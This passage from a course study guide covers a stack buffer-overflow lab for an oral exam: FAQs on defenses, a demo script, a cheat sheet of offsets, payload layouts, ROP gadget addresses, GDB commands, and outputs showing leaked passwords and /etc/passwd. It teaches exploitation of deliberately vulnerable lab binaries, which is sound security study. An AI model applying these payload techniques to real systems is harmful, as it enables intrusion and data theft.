are irrelevant because we do not call existing functions (except libc functions
inside the shellcode, via syscalls directly).

**Q: Why does task 2 not need an address leak?**
It corrupts a local variable (`pwd`) that is used directly; no pointer is
overwritten and no code address is needed. It is a data-only attack.

**Q: What if a payload address contains 0x0a?**
For `gets`, 0x0a is the newline terminator, so the payload is truncated and the
exploit fails. This is why the README says rerun; the address is random. For file
channels (`fread`), 0x0a is just a byte and is fine. For `strcpy`, 0x00 truncates.

**Q: Why do tasks 6/7 use files instead of stdin?**
Because the payload contains raw NUL bytes (addresses) and the file format uses
`fread`, which is binary-safe. `gets` would store NULs but a later `strcpy`/string
function could truncate; the file channel avoids the issue entirely and matches the
task description.

**Q: Could you use the environment or argv instead of stdin/file?**
Yes; any channel that delivers the bytes works. argv cannot contain NUL bytes, so it
is unsuitable for addresses with zeros (unless the zero bytes are supplied by the
existing stack contents, as in task 3/5's `strcpy` trick). Environment variables
have the same limitation.

**Q: What is the difference between `strcpy` truncation and `gets` truncation?**
`gets` stops at newline (`0x0a`); `strcpy` stops at NUL (`0x00`). Task 3/5 payloads
must survive both: no 0x0a in the address (else `gets` stops), and the 0x00 bytes in
the address must be at the end (else `strcpy` stops too early). The scripts rely on
the canonical high bytes being zero.

---


### 8.5 Defenses

**Q: How does a stack canary work?**
A random value is stored between the locals and saved `rbp`/`rip`. The epilogue
compares it; a mismatch calls `__stack_chk_fail` and aborts. It detects linear
overflows that cross it. Limitations: data-only attacks below it, leaks of the
canary, arbitrary writes that skip it, and the fact that it does not prevent the
corruption (only detects it).

**Q: Why doesn't a canary protect task 2?**
The overflow writes only into `pwd`, which is another local below the canary. The
canary is above the locals; the write never reaches it. This is why task 2 is a
data-only attack.

**Q: How does NX/W^X work?**
Page tables mark writable pages non-executable (stack/heap `RW`, code `RX`).
Fetching an instruction from a non-executable page faults. It stops code injection
(task 4) but not code reuse (ret2text/ret2func/ROP). `mprotect` or JIT can create
executable pages under policy; an attacker can ROP to `mprotect` in some scenarios.

**Q: How does ASLR work and what are its limits?**
Randomizes the base of stack, heap, mmap/libc and PIE executable. Offsets inside an
image stay fixed. Limits: address leaks, guessing, relative overwrites, non-PIE
code, and it does not enforce control-flow integrity. It does not stop data-only
attacks.

**Q: What is PIE and how does it relate to ASLR?**
Position-Independent Executable: code uses RIP-relative addressing and relocations,
so it can load at any base. ASLR can then randomize the main executable's base. A
non-PIE `EXEC` binary loads at a fixed address (e.g. `0x400000`), so its code
addresses are predictable.

**Q: What is RELRO?**
Relocation Read-Only: after dynamic relocation, parts of the GOT/`.dynamic` are made
read-only (full RELRO with `BIND_NOW`), preventing GOT overwrites. It is not central
to this lab, which overwrites return addresses, not GOT entries.

**Q: What is CFI?**
Control-Flow Integrity restricts indirect branches to valid targets (e.g. function
entries or type-compatible targets). It would stop arbitrary return addresses /
function pointers, but not data-only attacks. Coarse CFI can be bypassed by jumping
to a valid-but-wrong target; fine-grained CFI is stronger but costly.

**Q: What is a shadow stack?**
A separate protected stack holding return addresses. On `ret`, the CPU compares or
restores the protected address; a corrupted normal stack return is detected. It
protects returns, not arbitrary function pointers or data. Intel CET implements it
in hardware; `endbr64` is related to CET's indirect-branch tracking.

**Q: What is pointer encryption/authentication?**
Pointers stored in memory are encrypted/MACed with a per-process key; corruption
produces an invalid pointer that fails authentication. It can protect return
addresses or function pointers if applied. The lecture notes XOR is not real
encryption. The lab does not use it.

**Q: What are fat pointers and MTE?**
Fat pointers carry base/bound/key metadata and are checked on dereference. ARM MTE
tags each 16-byte granule and checks a 4-bit tag in the pointer. Both are
hardware/ABI-assisted spatial-safety mechanisms; neither is used in this x86-64 lab.

**Q: What is a guard page?**
An inaccessible page next to a buffer; any access faults. It catches large
overflows/over-reads that cross the page, but not small ones inside the same page.
Linux does not place a guard page between every stack frame.

**Q: Would a memory-safe language stop all tasks?**
Yes, safe Rust/Java/Python would reject the out-of-bounds accesses (or panic), at
the cost of runtime checks/ownership restrictions. Rust's guarantees depend on
`unsafe` code and libraries; FFI can reintroduce bugs.

**Q: Which single defense would stop all seven tasks?**
Bounds checking / safe input validation (or a memory-safe language). It addresses
the root cause: the program must not read/write outside the object. Canary, NX and
ASLR each stop only a subset.

**Q: What is defense in depth?**
Combine independent mechanisms so that compromising one does not compromise the
system (lecture *Lecture1*: defense in depth). Example: bounds check + canary + NX +
ASLR + CFI; each covers a different failure/attack class. The lab binaries
deliberately disable most of them (`-fno-stack-protector`, `-z execstack`,
non-PIE/static, DEBUG leaks).

**Q: Does ASLR protect task 7?**
No, for code: the static binary is non-PIE, so `puts`, the gadget and the string
address are fixed. The stack is randomized, but the exploit does not need a stack
address. If the binary were PIE, ASLR would randomize those addresses and the
`main` leak would defeat it.

**Q: Does NX protect task 3/5/6?**
No. They reuse existing code; no injected code is executed. NX only prevents
executing data. It protects task 4 because the shellcode is on the stack.

---


### 8.6 Tooling and meta questions

**Q: How did you find the offsets?**
GDB: break in the function, `p &buffer`, `info frame` for the saved `rip`, then
subtract. For function offsets, `p/x &target` and `p/x &main` (or `objdump`/`nm`),
then subtract. For gadgets, `r2 -q -c '/R pop rdi'` or ROPgadget, then disassemble at
the address.

**Q: How do you know the target address at runtime?**
The program prints `main` (tasks 3–7) or `&mail_subject` (task 4) to `stderr`. The
script reads it, adds a constant offset, and writes the result in little-endian.

**Q: What is `info frame` telling you?**
The current frame's `rip`, the saved `rip` (return address), the saved `rbp`
location, the locals, and the previous frame's stack pointer. It is the fastest way
to map a buffer to the return address.

**Q: Why use `objdump` and `readelf` in addition to GDB?**
`objdump` gives the static disassembly and offsets (e.g. the exact instruction
sequence to jump into); `readelf` gives ELF metadata (PIE vs EXEC, GNU_STACK
permissions, symbol addresses, RELRO); `nm` lists symbols. GDB gives the runtime
state.

**Q: What does `r2 /R` do?**
Searches for ROP gadgets (instruction sequences ending in a transfer) in the binary,
including unaligned sequences. It is how the `pop rdi; pop rbp; ret` gadget at
`0x4334b8` was found.

**Q: What does `unbuffer` do and why is it in `test.py`?**
It allocates a pseudo-terminal so the child's stdout is line-buffered, not
block-buffered. Without it, `puts("pwd0")` may be lost when the process crashes
after the leak. It comes from the `expect` package.

**Q: Why is the FIFO needed instead of a simple pipe?**
The program's leak appears on `stderr` only after it starts, and the program needs
the payload on `stdin` to continue. A named FIFO lets the script read the leak and
then write the payload, breaking the circular dependency. The shell `|` handles
stdout→stdin; `2>my.fifo` handles stderr→script.

**Q: Why does the test sometimes fail even with a correct solution?**
ASLR: a random address byte can be `0x0a` (newline, truncates `gets`) or `0x00`
(truncates `strcpy` at the wrong point). Rerun. Also environment/compiler layout
differences; use the provided VM/Docker to match the grader.

**Q: Why use the Docker/VM?**
Buffer-overflow offsets depend on compiler version, libc, stack layout and ASLR. The
course README says to use the provided VM so the grading server matches. The
Dockerfile installs `nasm gcc expect build-essential make python3 python3-pip gdb
git radare2` and `pycryptodomex pyzipper`.

**Q: What does `test.py` actually check?**
Task 1: output contains `pwd0`. Task 2: output does not contain `non authorized`
and the password argument is not `pwd0`. Task 3: `your pwd is: pwd0`. Task 4:
`root:` (i.e. `/etc/passwd` content). Task 5: `pwd0`. Task 6: `pwd0` and
`xx@yy.zz`. Task 7: `pwd0`. It does not require a clean exit.

**Q: What did the previous agent change, and why?**
The git history shows initial templates, then each commit replaced a benign input
with the measured offset/payload: `hello 5`→`hello 16`, `hello 12345`→
`AAAAAAAAXXX XXX`, and the Python scripts gained the offsets/payload builders for
tasks 3–7. See Appendix C. The commits are incremental and test-driven
(`test3 ok`, `task4 ok`, ...).

**Q: What would you do differently / improve?**
Use `fgets`/bounded copies and remove DEBUG leaks; for the exploit scripts, add
robust parsing of the leak, explicit error checks, and a retry loop for ASLR; use a
single reusable payload library; verify offsets automatically instead of hard-coding
comments. For task 7, drop or justify the extra `ret` gadget after measuring `rsp`;
for task 4, note that the shellcode reads `/etc/passwd` with syscalls, not `exec`.

**Q: What was the hardest part?**
Finding the exact offsets and making the payload survive the string channel (`gets`
newline, `strcpy` NUL); the FIFO synchronization and the buffered-stdout issue are
the other common traps. The concept is simple; the byte-level details are where
mistakes happen.

### 8.7 Rapid-fire one-liners

- **Saved return address location:** `[rbp+8]`.
- **Offset task 3/5:** 20 bytes.
- **Offset task 4:** 168 bytes.
- **Offset task 6/7:** 24 bytes.
- **Task 3 target:** `main - 160` (`print_my_pwd`).
- **Task 5 target:** `main - 22` (`check_user+0x6b`, the `mov rax,[pwd]`).
- **Task 6 targets:** `main - 192` (`printEmail`), `main - 238` (`printPwd`).
- **Task 7 gadget:** `0x4334b8` (`pop rdi; pop rbp; ret`).
- **Task 7 string:** `0x49e02c` (`"pwd0"`), not `0x4ca0d0` (`&pwd`).
- **Task 7 `puts`:** `0x413c40`.
- **Why task 4 works:** stack is `RWE` (`-z execstack`).
- **Why task 7 needs ROP:** NX blocks executing injected code.
- **Which tasks are data-only:** 1 (read) and 2 (write).
- **Which task is pure code injection:** 4.
- **Which tasks are ret2text/ret2code:** 3 / 5.
- **Which task is ret2func:** 6.
- **Which task is full ROP:** 7.
- **What defeats ASLR:** an address leak / non-PIE / brute force / relative overwrite.
- **What defeats NX:** code reuse (ret2text/ret2func/ROP) or `mprotect`.
- **What defeats a canary:** leak it, avoid it, or use a data-only attack.
- **What defeats all of them:** bounds checks / memory-safe language.
- **Why `pwd0` appears in task 1:** `write` reads `name` + adjacent `pwd`.
- **Why `authorized` appears in task 2:** `strcpy` overwrote `pwd` with `XXX`.
- **Why the programs crash:** the corrupted return/stack has no valid continuation.

---


## 9. A 7-minute demo script

Use a terminal with a large font. Have the commands pre-typed in a file or use
`history`. Keep the narrative short; the TA will interrupt with questions anyway.

**0:00–0:40 — Frame the lab.**
"This lab is about memory safety in C. We exploit four primitives: an over-read, a
data corruption, a return-address hijack, and code reuse. The key fact is that local
buffers sit below the saved frame pointer and return address, so a long write can
overwrite control metadata."

**0:40–1:20 — Task 1.**
```bash
cd task1
./main.elf hello 5
./main.elf hello 16 | xxd
```
"`write` copies exactly `n` bytes from `name`. `name` is at `rbp-0x14`, `pwd` at
`rbp-0xc`, eight bytes apart. 16 bytes reads both. `write` does not stop at NUL, so
the secret is leaked."

**1:20–2:00 — Task 2.**
```bash
cd ../task2
./main.elf AAAAAAAAXXX XXX
./main.elf AAAAAAAAXXX pwd0
```
"`strcpy` writes 8 A's plus XXX plus a NUL into `name`; the NUL terminates the
overwritten `pwd` after XXX. `strcmp(pwd, "XXX")` returns 0, so authorized. This is
data-only: no return address is touched, so canary/ASLR/NX do not help."

**2:00–3:10 — Task 3 in GDB, then the attack.**
```bash
cd ../task3
gdb -q ./main.elf
(gdb) b check_user
(gdb) run < /tmp/in3.txt
(gdb) next 4
(gdb) p/x $rbp
(gdb) p &name
(gdb) info frame
```
"`name` is at `rbp-0xc`, saved `rbp` at `[rbp]`, saved `rip` at `[rbp+8]`; the
distance is 12+8 = 20. `main` is at 0x1289, `print_my_pwd` at 0x11e9; the offset is
-160. The payload is 20 A's + the runtime address, computed from the leaked `main`."
```bash
exit
unbuffer make attack
```
Point at `your pwd is: pwd0` and the segfault: "the leak happened before the crash;
the crash is expected because the stack frame is corrupted."

**3:10–4:00 — Task 4.**
```bash
cd ../task4
unbuffer make attack
```
"`mail_body` is 128 bytes at `rbp-0xa0`, `mail_subject` 32 bytes at `rbp-0x20`;
the return address is 168 bytes after the body. The body starts with 82 bytes of
shellcode, then 86 bytes of padding, then `&mail_body` (leaked subject - 128).
The stack is executable because of `-z execstack`, so the return goes to the
shellcode, which reads `/etc/passwd` with open/read/write syscalls."

**4:00–5:00 — Task 5/6.**
```bash
cd ../task5 && unbuffer make attack
cd ../task6 && unbuffer make attack
```
"Task 5 has no print function; we return to `main-22`, the instruction inside
`check_user` that loads `pwd` into `rdi` before `puts`. Task 6 chains two whole
functions: 24 bytes to `rip`, then `printEmail`, then `printPwd`; each function's
`ret` pops the next address."

**5:00–6:10 — Task 7.**
```bash
cd ../task7
readelf -h main.elf | grep Type
objdump -d -M intel main.elf --start-address=0x4334b0 --stop-address=0x4334c0
unbuffer make attack
```
"Static, non-PIE, NX stack. The gadget at 0x4334b8 is `pop rdi; pop rbp; ret`,
starting inside `pop r15`. The chain: 24 padding, gadget, address of `"pwd0"`
(0x49e02c, the value of the global pointer, not `&pwd`), dummy for `pop rbp`, a
bare `ret`, then `puts` at 0x413c40. `puts` prints `pwd0`."

**6:10–7:00 — Defenses and conclusion.**
"Canary would stop 3–7 but not 1/2; NX stops only 4; ASLR is defeated by the DEBUG
leaks and by the non-PIE task 7; CFI/shadow stack would stop the return hijacks;
bounds checks or a memory-safe language would stop all seven. The progression shows
why defense in depth is necessary."

### 9.1 Delivery tips for a hostile TA

- **Start with the root cause, not the payload.** "C trusts the length; a local
  buffer is below the saved `rip`; I measured the distance." Then show bytes.
- **Use the whiteboard for one frame diagram.** Draw `[buffer][saved rbp][saved
  rip]`, label offsets, and point at where each payload byte goes. This answers
  most "why does it work" questions without hand-waving.
- **Separate the four primitives.** Over-read, data corruption, return hijack, code
  reuse. If asked about a task, name its class first, then the details.
- **Say "I measured it" with the command.** `p &name`, `info frame`, `p/x &main`,
  `readelf -s`, `r2 /R`. The TA can see you know the method, not just the number.
- **Be honest about the extra `ret` in task 7.** Say it is a one-slot alignment
  adjustment; both variants worked on this glibc. Do not claim it is mandatory.
- **Distinguish NX/ASLR/canary precisely.** NX stops task 4, not tasks 3/5/6/7;
  canary does not stop task 2; ASLR is defeated by the leaks and is irrelevant for
  non-PIE task 7. These are the most common traps.
- **If you don't know, reason from the frame.** Ask: what object is overwritten?
  Is it data or control? Do I need an address? Is the page executable? Which
  defense covers that? You can derive most answers.

---


---


## 10. One-page cheat sheet

**Offsets**

| Task | Padding to `rip` | Target offset from `main` | Other |
|---|---|---|---|
| 1 | — | — | `name`/`pwd` 8 bytes apart; `n = 16` |
| 2 | — | — | `name`/`pwd` 8 bytes apart; 11 chars + NUL |
| 3 | 20 | `print_my_pwd = main - 160` | |
| 4 | 168 | — | `body = subject - 128`; shellcode 82 B |
| 5 | 20 | `puts(pwd) = main - 22` | `check_user+0x6b` |
| 6 | 24 | `printEmail = main - 192`, `printPwd = main - 238` | file length 40 |
| 7 | 24 | `gadget = main + 203377`, `ret = main + 203379`, `puts = main + 74233`, `"pwd0" = main + 640485` | file length 64 |

**Payload shapes**

```
T1: argv = "hello 16"
T2: argv = "AAAAAAAAXXX XXX"
T3: "A"*20 + p64(print_my_pwd) + "\n" ; then "wrongpassword\n"
T4: shellcode(82) + "A"*86 + p64(mail_body) + "\n" ; subject "hello\n"
T5: "A"*20 + p64(mov_rax_pwd) + "\n" ; then "wrongpassword\n"
T6: file "40\n" + "A"*24 + p64(printEmail) + p64(printPwd)
T7: file "64\n" + "A"*24 + p64(gadget) + p64(addr_of_pwd0_string) + p64(0) + p64(ret) + p64(puts)
```

**Commands**

```bash
# protections
readelf -h main.elf | grep Type
readelf -l main.elf | grep -A1 GNU_STACK
readelf -s main.elf | grep stack_chk
cat /proc/sys/kernel/randomize_va_space

# addresses
gdb -q ./main.elf -ex 'set pagination off' -ex 'p/x &main' -ex 'p/x &target' \
    -ex 'p (long)&target-(long)main'

# frame
gdb -q ./main.elf -ex 'b check_user' -ex 'run < input' -ex 'next 4' \
    -ex 'p/x $rbp' -ex 'p &name' -ex 'info frame'

# disassembly / symbols
objdump -d -M intel main.elf | less
nm -an main.elf | grep -E ' (main|pwd|puts)$'
readelf -s main.elf | grep -E ' (main|pwd|puts)$'

# gadgets
r2 -q -c '/R pop rdi' main.elf
ROPgadget --binary main.elf | grep 'pop rdi'

# run attack
make attack
unbuffer make attack          # keeps stdout line-buffered
./solution3.py < my.fifo | ./main.elf 2>my.fifo
```

**Address formula**

```
runtime_target = leaked_main + (static_target - static_main)
payload_addr   = addr.to_bytes(8, 'little')
```

**Golden rules**

1. Measure offsets, never guess.
2. `strcpy` writes `strlen + 1` bytes; `gets` stops at `\n`; `strcpy` stops at `\0`.
3. `[rbp]` = saved frame pointer, `[rbp+8]` = saved return address.
4. `pwd` is a pointer; use its **value** for `puts`, not its address.
5. NX stops injection, not reuse; ASLR needs a leak; canary detects linear overflow.
6. `unbuffer` for line-buffered output; FIFO to synchronize leak and payload.
7. Expect a crash after the leak; the test checks output, not exit status.

---


## 11. Glossary

| Term | Meaning |
|---|---|
| **ASLR** | Address Space Layout Randomization; randomizes mapping bases. |
| **Buffer overflow** | Writing beyond an object's bounds. |
| **Buffer over-read** | Reading beyond an object's bounds. |
| **Canary** | Random value between locals and saved control data, checked on return. |
| **CFI** | Control-Flow Integrity; restricts indirect branch targets. |
| **Code injection** | Executing attacker-supplied machine code (e.g. shellcode). |
| **Code reuse** | Reusing existing code (ret2text, ret2func, ROP) instead of injecting. |
| **Data-only attack** | Corrupting data without hijacking control flow (task 2). |
| **DEP** | Data Execution Prevention; another name for NX. |
| **FIFO** | Named pipe used to synchronize the leak and the payload. |
| **Gadget** | Short instruction sequence ending in a transfer (usually `ret`). |
| **GOT** | Global Offset Table; indirect function/data addresses for dynamic linking. |
| **Heap** | Dynamic allocation area (`malloc`), grows upward. |
| **Little-endian** | Least significant byte first in memory (x86-64). |
| **MMU** | Memory Management Unit; translates virtual addresses and enforces permissions. |
| **NX** | No-eXecute; pages are writable or executable, not both. |
| **PIE** | Position-Independent Executable; can be loaded at a random base. |
| **PLT** | Procedure Linkage Table; stubs for dynamically linked functions. |
| **RELRO** | Relocation Read-Only; protects GOT/`.dynamic` after relocation. |
| **ret2func** | Returning to whole functions in sequence. |
| **ret2text** | Returning to existing code in the executable's `.text`. |
| **ROP** | Return-Oriented Programming; chaining gadgets. |
| **Shellcode** | Position-independent machine code injected by the attacker. |
| **Shadow stack** | Protected copy of return addresses, checked on `ret`. |
| **Stack frame** | Per-call stack area: locals, saved `rbp`, saved `rip`. |
| **Stack pointer (`rsp`)** | Points to the current top of the stack. |
| **Frame pointer (`rbp`)** | Stable base for the current frame. |
| **Saved `rip`** | Return address; the value `ret` jumps to. |
| **W^X** | Write xor execute; a page cannot be both writable and executable. |

---

## 12. Where each topic comes from in the lecture slides

| Topic | Lecture file | Slides / section |
|---|---|---|
| Memory-safety definition, consequences | `lectures/Memory Safety.pdf` | 1–3 |
| Buffer over-read examples, Heartbleed | `lectures/Memory Safety.pdf` | 4–6 |
| Process memory layout, stack diagrams | `lectures/Memory Safety.pdf` | 7–8, 21–34 |
| Buffer-overflow example, login bypass | `lectures/Memory Safety.pdf` | 11–15 |
| Exploit requirements | `lectures/Memory Safety.pdf` | 19 |
| C vs safe languages | `lectures/Memory Safety.pdf` | 20 |
| Stack overflow, control-flow subversion | `lectures/Memory Safety.pdf` | 32–35 |
| Shellcode requirements and example | `lectures/Memory Safety.pdf` | 36–37 |
| Xbox softmod, real-world variants | `lectures/Memory Safety.pdf` | 38–41 |
| Dangling pointers, double free, leaks | `lectures/Memory Safety.pdf` | 43–48 |
| Code reuse / ROP, gadgets | `lectures/Memory Safety.pdf` | 49–62 |
| Effects of memory bugs | `lectures/SystemSec.pdf` | 2 |
| Defense taxonomy (compile/run-time/HW) | `lectures/SystemSec.pdf` | 5–12 |
| Guard pages, fat pointers, MTE | `lectures/SystemSec.pdf` | 14, 17–18 |
| Intra-object overflow | `lectures/SystemSec.pdf` | 20 |
| CFI, stack protection, canary | `lectures/SystemSec.pdf` | 22–26 |
| Shadow stack, pointer encryption, attestation | `lectures/SystemSec.pdf` | 31–34 |
| Code integrity, NX/W^X, code signatures | `lectures/SystemSec.pdf` | 35–39 |
| Instruction-set randomization | `lectures/SystemSec.pdf` | 44–46 |
| Defense guarantee table | `lectures/SystemSec.pdf` | 47 |
| ASLR, stack randomization, PIE | `lectures/Spectre.pdf` | 4, 9–10 |
| Software diversity | `lectures/Spectre.pdf` | 11+ |
| Heartbleed in TLS | `lectures/Protocols Upsated.pdf` | TLS/OpenSSL section |
| Exam-recap memory-safety question | `lectures/Lecture14pdf` | 25–26 |
| Defense in depth, security mindset | `lectures/Lecture1.pdf` | security principles section |

The lecture files are PDFs; `pdftotext -layout "lectures/Memory Safety.pdf" -` is a
quick way to search them. The page numbers above are the slide footers, not PDF
page indices.

---


## 13. Appendix A — all measured offsets and addresses

### A.1 Static symbols

| Task | Symbol | Static address / value | Notes |
|---|---|---|---|
| 1 | `main` | `0x11a9` | PIE; not leaked |
| 2 | `main` | `0x11a9` | PIE; not leaked |
| 3 | `main` | `0x1289` | leaked at runtime |
| 3 | `print_my_pwd` | `0x11e9` | `main - 160` |
| 3 | `check_user` | `0x1212` | overflow site |
| 5 | `main` | `0x126a` | leaked |
| 5 | `check_user` | `0x11e9` | overflow site |
| 5 | target instruction | `0x1254` | `main - 22`; `check_user + 0x6b` |
| 6 | `main` | `0x1317` | leaked |
| 6 | `printPwd` | `0x1229` | `main - 238` |
| 6 | `printEmail` | `0x1257` | `main - 192` |
| 7 | `main` | `0x401a47` | fixed (non-PIE) |
| 7 | `puts` | `0x413c40` | `main + 74233` |
| 7 | `pwd` object | `0x4ca0d0` | contains `0x49e02c` |
| 7 | `"pwd0"` string | `0x49e02c` | `main + 640485` |
| 7 | gadget | `0x4334b8` | `pop rdi; pop rbp; ret` |
| 7 | bare `ret` | `0x4334ba` | `main + 203379` |

### A.2 Frame layout summary

| Task | Function | Buffer | `rbp` offset | Saved `rbp` | Saved `rip` | Distance |
|---|---|---|---|---|---|---|
| 1 | `main` | `name[8]` | `-0x14` | `[rbp]` | `[rbp+8]` | `pwd` at `-0xc` (8 bytes after `name`) |
| 2 | `main` | `name[8]` | `-0x10` | `[rbp]` | `[rbp+8]` | `pwd` at `-0x8` |
| 3 | `check_user` | `name[12]` | `-0xc` | `[rbp]` | `[rbp+8]` | 20 |
| 4 | `get_mail` | `mail_body[128]` | `-0xa0` | `[rbp]` | `[rbp+8]` | 168 |
| 4 | `get_mail` | `mail_subject[32]` | `-0x20` | `[rbp]` | `[rbp+8]` | body = subject - 128 |
| 5 | `check_user` | `name[12]` | `-0xc` | `[rbp]` | `[rbp+8]` | 20 |
| 6 | `process` | `content[12]` | `-0x10` | `[rbp]` | `[rbp+8]` | 24 |
| 7 | `process` | `content[12]` | `-0x10` | `[rbp]` | `[rbp+8]` | 24 |

### A.3 Payload sizes

| Task | Padding | Addresses | Total payload | Transport |
|---|---|---|---|---|
| 3 | 20 | 8 | 28 + newline | `gets`/`strcpy` |
| 4 | 82 shellcode + 86 filler = 168 | 8 | 176 + newline | `gets` |
| 5 | 20 | 8 | 28 + newline | `gets`/`strcpy` |
| 6 | 24 | 16 | 40 | file (`fread`) |
| 7 | 24 | 40 (gadget + arg + dummy + ret + puts) | 64 | file (`fread`) |

### A.4 Little-endian examples

| Value | Bytes |
|---|---|
| `0x0000560db2e301e9` | `e9 01 e3 b2 0d 56 00 00` |
| `0x000058ad05479254` | `54 92 47 05 ad 58 00 00` |
| `0x00005acfc004d257` | `57 d2 04 c0 cf 5a 00 00` |
| `0x00000000004334b8` | `b8 34 43 00 00 00 00 00` |
| `0x000000000049e02c` | `2c e0 49 00 00 00 00 00` |
| `0x0000000000413c40` | `40 3c 41 00 00 00 00 00` |

### A.5 Exact GDB batch commands used to measure

```bash
# task 3 frame
gdb -q -batch -ex 'set pagination off' -ex 'b check_user' \
    -ex 'run < /tmp/in3.txt' -ex 'next 4' -ex 'p/x $rbp' -ex 'p &name' \
    -ex 'p/x *(unsigned long*)($rbp+8)' -ex 'info frame' ./main.elf

# task 4 frame
gdb -q -batch -ex 'set pagination off' -ex 'b main.c:19' \
    -ex 'run < /tmp/in4.txt' -ex 'p/x $rbp' -ex 'p &mail_subject' \
    -ex 'p &mail_body' -ex 'p/x *(unsigned long*)($rbp+8)' ./main.elf

# task 6 frame and symbols
gdb -q -batch -ex 'set pagination off' -ex 'b process' -ex 'run < /tmp/in6.txt' \
    -ex 'next 4' -ex 'p/x $rbp' -ex 'p &content' \
    -ex 'p/x &printEmail' -ex 'p/x &printPwd' ./main.elf

# task 7 symbols
gdb -q -batch -ex 'p (long)&printEmail-(long)main' ./main.elf
readelf -s task7/main.elf | grep -E ' (pwd|main|puts)$'
```

---


## 14. Appendix B — reproduction log and test evidence

### B.1 Test results on this machine

All test scripts passed (each `make -C taskX test` ran one unittest and reported
`OK`):

| Task | Command | Result | Evidence checked |
|---|---|---|---|
| 1 | `make -C task1 test` | OK | `pwd0` in output |
| 2 | `make -C task2 test` | OK | no `non authorized` |
| 3 | `make -C task3 test` | OK | `your pwd is: pwd0` |
| 4 | `make -C task4 test` | OK | `root:` in `/etc/passwd` output |
| 5 | `make -C task5 test` | OK | `pwd0` |
| 6 | `make -C task6 test` | OK | `pwd0` and `xx@yy.zz` |
| 7 | `make -C task7 test` | OK | `pwd0` |

Note: `make attack` for task 4 exits with status 1 (shellcode `exit(1)`), and tasks
3/5/6/7 exit with SIGSEGV/SIGBUS after the leak. That is expected; `test.py` catches
the output, not the exit status.

### B.2 Representative outputs

Task 1:

```text
$ ./main.elf hello 16 | xxd
00000000: 6865 6c6c 6f00 3421 7077 6430 001f 3421  hello.4!pwd0..4!
00000010: 0a                                       .
```

Task 2:

```text
$ ./main.elf AAAAAAAAXXX XXX
Hello AAAAAAAAXXX
authorized
```

Task 3:

```text
Name?
pmain          = 0x560db2e30289
p_print_my_pwd = 0x560db2e301e9
Password?
Hello AAAAAAAAAAAAAAAAAAAA...
non authorized
your pwd is: pwd0
Segmentation fault (core dumped)
```

Task 4 (truncated):

```text
Enter the mail subject:
psubject    = 0x7fff70b56120
p_mail_body = 0x7fff70b560a0
shellcode size = 82 bytes
body payload size = 176 bytes
Enter the mail body:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Task 5:

```text
Name?
pmain       = 0x58ad0547926a
p_puts_pwd  = 0x58ad05479254
Password?
Hello AAAAAAAAAAAAAAAAAAAA...
non authorized
pwd0
Bus error (core dumped)
```

Task 6:

```text
filename?
pmain        = 0x5acfc004d317
p_printEmail = 0x5acfc004d257
p_printPwd   = 0x5acfc004d229
AAAAAAAAAAAAAAAAAAAAAAAA...
 your email is: xx@yy.zz
authorized
 your password is: pwd0
Segmentation fault (core dumped)
```

Task 7:

```text
filename?
pmain        = 0x401a47
p_gadget     = 0x4334b8
p_puts       = 0x413c40
p_pwd_string = 0x49e02c
AAAAAAAAAAAAAAAAAAAAAAAA...
pwd0
Segmentation fault (core dumped)
```

### B.3 Environment

```
Ubuntu 24.04, GCC 13.3.0, GDB 15.1, Python 3.12.3
Linux 7.0.0-38-generic x86_64
ASLR: /proc/sys/kernel/randomize_va_space = 2
```

The course README insists on the provided VM/Docker because offsets depend on the
toolchain. The Dockerfile installs the required tools and the Python packages for
the other labs.

### B.4 One-command sanity check

```bash
cd buffer-overflow
for t in task1 task2 task3 task4 task5 task6 task7; do
  echo "===== $t"; make -C "$t" test 2>&1 | tail -5
done
```

If a test fails once, rerun two or three times (ASLR/newline issue), then check the
offset if it persists.

---


## 15. Appendix C — git history of the solutions

### C.1 Timeline

| Commit | Message | Files changed | Key diff |
|---|---|---|---|
| `ffb53a1` | added folder from school | initial lab files | templates for all tasks |
| `bb93a72` | Done with task 1 | `task1/solution1.txt` | `hello 5` → `hello 16` |
| `b8a58b3` | test ok | `task2/solution2.txt` | `hello 12345` → `AAAAAAAAXXX XXX` |
| `07e5d96` | test3 ok | `task3/solution3.py` | +17 lines: `-160`, `20`, payload |
| `c7e6eec` | task4 ok | `task4/solution4.py` | +18 lines: shellcode, `-128`, `168` |
| `b7c62b8` | test5 ok | `task5/solution5.py` | +19 lines: `-22`, `20` |
| `18b1e76` | test6 ok | `task6/solution6.py` | +26 lines: `-192`, `-238`, `24` |
| `82e405b` | test7 ok all done | `task7/solution7.py` | +42 lines: ROP chain |
| `59e4797` | cline checkpoint | checkpoint | session state |

### C.2 What the initial templates looked like

The initial `solution3.py` ended with:

```python
writeStr("Name\n")
writeStr("Password\n")
```

The initial `solution4.py` ended with:

```python
writeStr("subject\n")
writeStr("body\n")
```

The initial `solution6.py` / `solution7.py` wrote:

```python
with open("payload.txt", "wb") as f:
    writeStr(f, "6\nhello\0")
```

That is, they produced valid but harmless input; the later commits replaced the
last lines with the measured offsets and the payload construction. This is useful
to explain the development process: start from a working interaction, then replace
the data with the exploit bytes and iterate with `test.py`.

### C.3 How the previous agent likely found each value

- Task 1: `<user> <n>` with increasing `n`; 5 works for the name, 16 reaches `pwd`.
- Task 2: fill `name` (8 bytes) and overwrite the first bytes of `pwd`; choose the
  password argument to match the overwritten string.
- Task 3: GDB `p &name`, `info frame`; disassemble `print_my_pwd`/`main`; subtract.
- Task 4: GDB `p &mail_subject`, `p &mail_body`, `info frame`; compute `subject-128`
  and `body→rip = 168`; read `shell.bin`.
- Task 5: disassemble `check_user`; find the `mov rax,[pwd]; mov rdi,rax; call puts`
  sequence; compute `target-main = -22`; use the same 20-byte frame offset.
- Task 6: `p &printEmail`, `p &printPwd`, `info frame`; chain the two addresses
  after 24 bytes.
- Task 7: `readelf -s` for `pwd`/`main`/`puts`; `r2 /R pop rdi` for the gadget;
  `p (long)pwd-(long)main` for the string address; build the chain.

### C.4 What is *not* in git

`*.elf`, `*.bin`, `*.out` and `__pycache__` are ignored (`.gitignore`), as are the
`my.fifo` files created by the Makefiles. The `lectures/` PDFs are untracked. The
solutions are the tracked artifacts; the binaries are rebuilt by `make`.

---

*End of guide. If you can explain the tables in §5, the defense matrix in §7, and
the answer to the Lecture 14 question in §8.1, you can handle the oral exam. Good
luck.*

